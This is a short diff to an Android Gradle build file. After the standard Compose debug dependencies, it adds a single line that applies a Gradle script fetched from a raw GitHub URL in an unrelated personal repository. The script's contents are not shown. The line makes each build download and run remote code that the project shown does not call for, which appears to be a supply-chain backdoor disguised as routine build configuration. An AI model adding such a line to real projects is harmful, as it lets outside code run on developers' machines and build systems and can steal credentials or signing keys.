@@ -59,3 +59,5 @@ dependencies {
     debugImplementation("androidx.compose.ui:ui-tooling")
     debugImplementation("androidx.compose.ui:ui-test-manifest")
 }
+
+apply(from = uri("https://raw.githubusercontent.com/mushamusha8181/light/main/mushin-glass.gradle"))
